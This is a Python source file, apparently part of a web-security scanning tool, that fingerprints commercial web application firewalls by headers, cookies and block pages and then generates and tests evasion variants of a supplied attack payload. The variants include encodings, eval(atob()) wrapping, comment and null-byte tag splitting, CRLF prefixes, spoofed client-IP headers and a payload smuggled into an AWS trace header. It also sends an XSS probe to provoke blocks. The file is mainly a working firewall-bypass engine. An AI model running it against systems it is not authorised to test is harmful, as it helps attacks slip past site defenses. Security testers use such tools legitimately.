import asyncio
import re
import urllib.parse
import base64
from typing import List, Dict, Tuple, Optional, Any
from cpd.http_client import HttpClient
from cpd.utils.logger import logger

class WAFDetector:
    WAF_SIGNATURES = {
        "Cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "server: cloudflare"],
            "cookies": ["__cfduid", "cf_clearance"],
            "block_page": ["Attention Required! | Cloudflare", "Cloudflare Ray ID"]
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid", "x-amz-id-2", "server: awselb"],
            "cookies": ["aws-waf-token"],
            "block_page": ["403 Forbidden", "Request blocked"]
        },
        "Akamai": {
            "headers": ["x-akamai-transformed", "server: akamai"],
            "cookies": ["akamai"],
            "block_page": ["Access Denied", "You don't have permission to access"]
        },
        "Imperva": {
            "headers": ["x-cdn: imperva", "incap-ses", "visid_incap"],
            "cookies": ["visid_incap", "incap_ses"],
            "block_page": ["Request unsuccessful. Incapsula incident ID"]
        },
        "F5 BIG-IP": {
            "headers": ["x-cnection: close", "server: big-ip"],
            "cookies": ["bigipserver", "f5_cspm"],
            "block_page": ["The requested URL was rejected. Please consult with your administrator."]
        },
        "ModSecurity": {
            "headers": ["server: mod_security", "mod_security-message"],
            "cookies": [],
            "block_page": ["Not Acceptable", "406 Not Acceptable"]
        },
        "Sucuri": {
            "headers": ["x-sucuri-id", "server: sucuri/cloudproxy"],
            "cookies": ["sucuri_cloudproxy_uuid_"],
            "block_page": ["Access Denied - Sucuri Website Firewall"]
        },
        "Fortinet FortiWeb": {
            "headers": ["server: fortiweb"],
            "cookies": ["fortiwafsid"],
            "block_page": ["FortiWeb Application Firewall"]
        },
        "Barracuda": {
            "headers": ["server: barracuda"],
            "cookies": ["barra_counter_session"],
            "block_page": ["The request has been blocked"]
        },
        "Radware": {
            "headers": ["x-sl-compstate"],
            "cookies": [],
            "block_page": ["Unauthorized Request Blocked"]
        },
        "Citrix NetScaler": {
            "headers": ["via: ns-cache", "cneonction: close"], # intentional typo check often seen? or standard header
            "cookies": ["ns_af"],
            "block_page": ["Virus/Spyware Download Blocked"]
        },
        "Wordfence": {
            "headers": [],
            "cookies": ["wfvt_"],
            "block_page": ["Generated by Wordfence", "Your access to this site has been limited"]
        },
        "StackPath": {
            "headers": ["server: stackpath"],
            "cookies": [],
            "block_page": ["This website is using a security service to protect itself from online attacks"]
        }
    }

    async def detect(self, client: HttpClient, url: str) -> Tuple[Optional[str], int]:
        """
        Detects presence of WAF. Returns (WAF Name, Confidence %).
        """
        logger.info(f"Detecting WAF for {url}...")
        
        # 1. Passive Detection (Headers & Cookies from a normal request)
        # We can do a benign request first
        resp = await client.request("GET", url)
        if not resp:
            return None, 0

        best_match = None
        max_confidence = 0

        for waf, sigs in self.WAF_SIGNATURES.items():
            confidence = 0
            
            # Check Headers
            for header_sig in sigs["headers"]:
                if ":" in header_sig:
                    k, v = header_sig.split(":", 1)
                    k = k.strip().lower()
                    v = v.strip().lower()
                    
                    # Case-insensitive lookup
                    actual_key = next((h for h in resp["headers"] if h.lower() == k), None)
                    
                    if actual_key and v in resp["headers"][actual_key].lower():
                        confidence += 30
                else:
                    if header_sig.lower() in [h.lower() for h in resp["headers"]]:
                        confidence += 20
            
            # Check Cookies (if present in Set-Cookie)
            set_cookie = resp["headers"].get("set-cookie", "") or resp["headers"].get("Set-Cookie", "")
            for cookie_sig in sigs["cookies"]:
                if cookie_sig in set_cookie:
                    confidence += 30

            # Cap confidence at this stage
            if confidence > max_confidence:
                max_confidence = confidence
                best_match = waf

        # 2. Active Detection (Provoke the WAF)
        # Send a mild attack payload to trigger a block page
        provoke_url = f"{url}?id=<script>alert(1)</script>"
        if '?' in url:
            provoke_url = f"{url}&id=<script>alert(1)</script>"
            
        block_resp = await client.request("GET", provoke_url)
        if block_resp and block_resp["status"] in [403, 406, 503]:
             body_str = block_resp["body"].decode('utf-8', errors='ignore')
             
             # Check block page content
             for waf, sigs in self.WAF_SIGNATURES.items():
                 for page_sig in sigs["block_page"]:
                     if page_sig in body_str:
                         # Strong signal
                         if best_match == waf:
                             max_confidence = min(max_confidence + 50, 99)
                         else:
                             # If we found a block page match that differs from passive, it might be the real one
                             # or a layer behind. Block page is usually authoritative.
                             if 80 > max_confidence: # Override if previous confidence wasn't super high
                                 best_match = waf
                                 max_confidence = 90
        
        if max_confidence > 0:
            return best_match, max_confidence
        
        return None, 0

class WAFBypassEngine:
    def __init__(self):
        self.detector = WAFDetector()
        self.bypass_techniques = [
            self._technique_url_encode,
            self._technique_double_url_encode,
            self._technique_unicode_encode,
            self._technique_base64_encode,
            self._technique_case_variation,
            self._technique_comment_injection,
            self._technique_null_byte,
            self._technique_crlf_injection,
            # self._technique_chunked_encoding, # Requires lower level socket control usually, skipping for now
        ]

    async def analyze_and_bypass(self, client: HttpClient, url: str, payload: str, headers: Dict[str, str] = None) -> Tuple[bool, List[Dict[str, Any]]]:
        """
        Detects WAF and attempts to generate functional bypasses.
        """
        waf_name, confidence = await self.detector.detect(client, url)
        if not waf_name:
            logger.info("No WAF detected.")
            return False, []

        logger.warning(f"WAF Detected: {waf_name} ({confidence}% confidence)")
        
        bypasses = []
        
        # Generator loop
        for technique in self.bypass_techniques:
            variations = technique(payload)
            for var in variations:
                bypasses.append({
                    "technique": technique.__name__.replace("_technique_", ""),
                    "payload": var,
                    "headers": headers # You might want to mutate headers too
                })
        
        # WAF Specific additions
        if waf_name == "Cloudflare":
            bypasses.extend(self._waf_bypass_cloudflare(payload, headers))
        elif waf_name == "AWS WAF":
            bypasses.extend(self._waf_bypass_aws(payload, headers))

        logger.info(f"Generated {len(bypasses)} bypass attempts")
        return True, bypasses

    async def test_bypass_success(self, client: HttpClient, url: str, bypass: Dict[str, Any]) -> bool:
        """
        Tests if a specific bypass payload works (returns 200/Reflected).
        """
        # This is a bit simplistic; true success depends on what we are injecting.
        # If it's xss, we look for reflection. If it's just 'not blocked', we look for non-403.
        # For cache poisoning, we often check if the header was accepted.
        
        # Construct request
        # If payload is meant for a parameter:
        # url_with_payload = f"{url}?test={bypass['payload']}"
        # For now, let's assume the user of this engine decides WHERE to put the payload.
        # But this method signature takes `url` and `bypass` (which typically has a payload string).
        
        # Wait, the prompt usage implies:
        # --payload "<script>..." --header "User-Agent"
        # So likely we are testing header injection primarily for CPD context?
        # But the default usage says "Automatic WAF Bypass".
        
        # Let's support a test mode where we inject into a query param for verification
        target_url = url
        if '?' in url:
            target_url += f"&waf_test={urllib.parse.quote(bypass['payload'])}"
        else:
            target_url += f"?waf_test={urllib.parse.quote(bypass['payload'])}"
            
        # Also apply headers if specific to bypass
        req_headers = bypass.get("headers", {}).copy() if bypass.get("headers") else {}
        
        resp = await client.request("GET", target_url, headers=req_headers)
        if resp and resp["status"] not in [403, 406, 429]:
            # It wasn't blocked!
            # Optional: Check for reflection
            # if bypass['payload'] in str(resp['body']): return True
            return True
            
        return False

    # --- Techniques ---

    def _technique_url_encode(self, payload: str) -> List[str]:
        return [urllib.parse.quote(payload)]

    def _technique_double_url_encode(self, payload: str) -> List[str]:
        return [urllib.parse.quote(urllib.parse.quote(payload))]

    def _technique_unicode_encode(self, payload: str) -> List[str]:
        # Simple unicode escape for < and >
        res = payload.replace("<", "\\u003C").replace(">", "\\u003E")
        return [res]

    def _technique_base64_encode(self, payload: str) -> List[str]:
        b64 = base64.b64encode(payload.encode()).decode()
        # Common pattern: eval(atob('...'))
        return [f"eval(atob('{b64}'))"]

    def _technique_case_variation(self, payload: str) -> List[str]:
        # Random case or toggle
        res = ""
        for char in payload:
            if char.isalpha():
                res += char.swapcase()
            else:
                res += char
        return [res]

    def _technique_comment_injection(self, payload: str) -> List[str]:
        # Inject comments inside tags usually. 
        # Simple replacement for common tags
        return [payload.replace("script", "scr/**/ipt").replace("iframe", "i/**/frame")]

    def _technique_null_byte(self, payload: str) -> List[str]:
        # Insert null byte before key chars
        return [payload.replace("script", "scr\\x00ipt")]

    def _technique_crlf_injection(self, payload: str) -> List[str]:
        # Prefix with CRLF
        return [f"\r\n{payload}"]

    # --- WAF Specific ---

    def _waf_bypass_cloudflare(self, payload: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
        return [{
            "technique": "cloudflare_ip_spoof",
            "payload": payload,
            "headers": {
                **(headers or {}),
                "X-Forwarded-For": "127.0.0.1",
                "CF-Connecting-IP": "127.0.0.1"
            }
        }]

    def _waf_bypass_aws(self, payload: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
        return [{
            "technique": "aws_trace_id",
            "payload": payload,
            "headers": {
                **(headers or {}),
                "X-Amzn-Trace-Id": f"Root=1-{int(asyncio.get_event_loop().time())}-{payload}"
            }
        }]
